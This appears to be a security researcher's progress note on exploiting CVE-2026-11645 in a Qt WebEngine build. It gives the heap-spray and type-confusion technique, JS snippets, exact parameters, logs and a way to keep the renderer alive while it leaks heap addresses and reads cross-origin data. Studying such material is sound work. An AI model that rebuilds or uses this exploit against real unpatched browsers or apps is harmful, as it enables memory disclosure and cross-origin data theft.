# W34 — CVE-2026-11645: OBSERVABLE INFO-LEAK ACHIEVED (addrof, self-verified)

Written 2026-08-05. Continues W33. Every line is **[M] measured** on the shipped Qt WebEngine
(Chromium base 130.0.6723.192, declared security-patch level 139.0.7258.67) unless marked
**[I] inferred**.

**Bottom line: attacker-page JavaScript now reads real renderer heap addresses back as JS
values, on a flagless plain HTTP page, 5/5 reproducible, with a byte-exact self-consistency
check and a clean A/B against patched Chrome 150. The renderer survives the whole sequence.**

W33's goal is met. W33's own framing of the blocker was wrong in two ways, both corrected
below.

---

## 1. Two W33 premises that were wrong [M]

**(a) "Changing MARK breaks the grooming."** Already refuted by W33's own last runs, which
post-dated the note. `p20-markab.html` holds the p13 configuration fixed and varies only the
sprayed word:

| MARK | fault log | RAX |
|---|---|---|
| `0x40000000` | fault-12102 / 12103 | `cage+0x40000000` ✓ |
| `0x20000001` (odd) | fault-12104 / 12105 / 12106 | `cage+0x20000001` ✓ |
| `0x8001` (odd) | fault-12110 | `cage+0x8001` ✓ |
| `0x8002` | fault-12111 | `cage+0x8002` ✓ |

7/7 across 4 values, odd and even. The groom is **not** MARK-sensitive, and the
denormal-vs-normal filler hypothesis is dead (`0x00008001_00008001` is a denormal and sprayed
fine). The `landed: null` oracle result came from `p18` scanning the *filler* arrays for the
payload while the aim pointed at a JSArray — it could not have seen a hit.

**(b) "The failure is grooming, not aim."** Backwards. The groom was always fine; the *aim*
was unattainable, because the target sea's cage offset moves far more than the ~8 bytes W33
assumed — measured `0x48010` (fault-12117) vs `0x5f968` (fault-12116), **96 KB apart**. No
measured MARK transfers between runs, so the debugger-measure-then-fire protocol cannot work.

---

## 2. ★★★ The unlock: stop encoding the address, spray a real pointer [M]

W33's filler was a *double whose two halves were the destination address*. That couples the
sprayed value to the target address — one number doing two jobs — which is exactly why aiming
demanded a cage offset.

Drop the coupling. The confused slot only has to contain **a 32-bit tagged word**; nothing
requires it to be a number the page computed. So spray a FixedArray whose every element is a
**real pointer to a JS object**:

```js
const S = String.fromCharCode.apply(null, arrOf256);   // flat SeqOneByteString
const a = new Array(320); for (j) a[j] = S;            // FixedArray, 8 + 4*320 = 1288 bytes
```

* `new Array(320)` of pointers → **1288 bytes**
* `new Array(160)` of doubles → **1288 bytes** ← W33's proven 4/4 groom

Same size class, so the groom geometry is untouched — but the confused slot now holds an
address **V8 itself chose**. `Cast<HeapNumber>(slot)->set_value_as_bits(bits)` then writes
8 bytes at `(pointee) + 4`, and for a String

```
map @0 | raw_hash_field @4 | length @8 | data @12
```

`+4` is exactly `{raw_hash_field, length}`. Smashing `length` makes `S.charCodeAt(k)` read past
the end of the string. **No cage offset appears anywhere in the exploit page.**

Secondary win: FixedArray elements are 4 bytes and all identical, so *any* 4-byte drift still
reads a whole valid pointer. Strictly more drift-tolerant than the double filler, which only
survived because its halves were made equal.

### Payload
`T = fromBits(NEWLEN, 0x12345672)` — a denormal double, so no NaN canonicalisation.
The low half lands on `raw_hash_field`; `bit0=0` (hash computed) and `bit1=1` (not an integer
index) stop V8 recomputing the hash over the now-oversized string.

---

## 3. Results [M]

`scratch/w33/p27-verified.html`, `nPad = 4`, `NEWLEN = 0x2100` (256 → 8448), `NELEM = 320`.

```
SURVIVED      sLen: 8448                     <- String::length smashed, 256 -> 8448
ADDROF        addrofS: 0x14b96d  repeats:545 <- 545 consecutive copies of one odd word
NEAR-HEADER   map:0x115869 props:0x775 elements:0x14d1ed lengthSmi:2048
CONSISTENT    predicted: 0x14d1f4  actual: 0x14d1f4      <- byte-exact
RESTORED      sLen: 256  ok: true            <- renderer left consistent
DONE          LEAKED+VERIFIED
```

8192 bytes of out-of-bounds renderer heap delivered to JS as numbers. **5/5 runs**
(ports 8720–8724) all `LEAKED+VERIFIED`, no faults (`TARGET = none`, `faults seen = 0`).

`addrofS` per run: `0x14b96d`, `0x149101`, `0x180119`, `0x14f1c9`, `0x14a581` — it moves with
the heap layout, so it is not a constant being read back.

### Why this is verified and not just plausible [M]
`near` is a 2048-element JSArray of `S` allocated immediately behind `S`. The window past `S`
therefore contains two *independently derived* facts:

* **(a)** a long run of one repeated odd word inside `near`'s backing store — every element is
  the same pointer, so that word **is** `&S | 1`;
* **(b)** `near`'s own JSArray header `{map, empty_fixed_array, elements, Smi(2048)}`.

They must agree:

```
(&S - 1) + 12 + 256 + runByteOffset   ==   (near.elements - 1) + 8
0x14b96c + 268 + 6012 = 0x14d1f4      ==   0x14d1ec + 8 = 0x14d1f4      ✓
```

Both sides are computed from *different leaked bytes*. Noise cannot satisfy this. 5/5 exact.

**Independent third check, from outside V8** [M]: the page reads `0x115869` out of bounds as
`near`'s map; `w33faultD.exe`, scanning the process with `VirtualQuery` in a completely
separate code path, reports `map=00115869` for the sprayed JSArrays in the same run
(`fault-8710.log`). A value JS read equals a value a debugger measured.

### A/B, product-like [M]
`ab.py p27ab-verified.html both 40 0x2100 4 f` — plain HTTP page, `WGLFLAGS=""`, a real
multi-process `WebEngineView` (not `--single-process`):

| side | result |
|---|---|
| **shipped Qt WebEngine** | `sLen: 8448` → `ADDROF ok` → `CONSISTENT ok` → `LEAKED+VERIFIED` |
| **patched Chrome 150** | `sLen: 256` → `NO-SMASH`, no leak |

The renderer did **not** die on either side. (`ab.py` prints a `RENDERER` beacon here; it is a
false positive — its grep for `TERMINATED` matches the QML *handler declaration* echoed at
`qt-run.log:33`. There is no `### RENDERER TERMINATED status=` event and no `LOADSTATUS 3`.)

---

## 4. Survivability [M]

Smashing `String::length` also changes the size the GC computes for the object
(`SeqString::SizeFor(length)`), so an over-long string is a landmine for the next major GC.
The page defuses it: the read loop writes into a **pre-allocated `Uint8Array`** and allocates
nothing, then a second firing with `T = fromBits(256, 0x12345672)` restores the original
length. `RESTORED ok:true` in 5/5 runs, and the page then allocates freely to send its report.

This is why the leak is a *quiet* primitive rather than a crash: no fault is generated at any
point (`faults seen = 0`).

---

## 5. What this changes about impact [M / I]

* **[M]** The primitive is now: attacker-chosen 8-byte write to `(any object the sprayed
  pointer names) + 4`, **plus** an out-of-bounds read of arbitrary length from a controlled
  string. Together these give addrof and a heap-relative read.
* **[M]** The V8 sandbox is enabled in this build, so the read/write are in-cage.
* **[M]** Site isolation is OFF here — one shared `v8::Isolate` (W17j). In-cage reach
  therefore extends to the tagged objects of **every document in that isolate, including the
  Wickr app document**, from an attacker's cross-origin frame. Cross-origin data compromise
  with no sandbox escape needed.
* **[I]** Composing this with a chosen-address write to reach full arbitrary in-cage R/W looks
  routine now that addresses are readable, but it is **not done**. See below.

## 6. NOT achieved — stated plainly

* **No arbitrary in-cage read/write.** The read is forward-only from `S`, bounded by the
  smashed length; the write destination is still "some object a sprayed pointer names, +4".
  Chaining `addrof` back into a chosen-address write (the double-filler path, now aimable
  because `addrofS` is known) has **not been executed**.
* **No sandbox escape, no code execution.** Unchanged from W33.
* The leak reads **32-bit cage-relative addresses**. The 64-bit cage base is not disclosed;
  with the sandbox on, in-cage memory holds no raw pointers to disclose.

## 7. Artifacts

`scratch/w33/` — `p24-strleak.html` (first working leak), `p25-addrof.html`,
`p26-addrof.html`, `p27-verified.html` (the reproducible one), `p27ab-verified.html`
(`__NELEM__` fixed at 320 for `ab.py`, which does not substitute it).
Runners unchanged: `run1.py PAGE NPAD PFX SECS PORT MARK NELEM` (MARK carries `NEWLEN`,
NELEM must be 320 so the harness's JSArray matcher, which keys on `len == NELEM*2`, reports
the same arrays the page leaks), `ab.py PAGE both SECS MARK NPAD PFX`.
Logs: `fault-8710.log` (harness cross-check), `fault-872{0..4}.log` (the 5/5),
`p27ab-verified.html.ab.json` (the A/B).
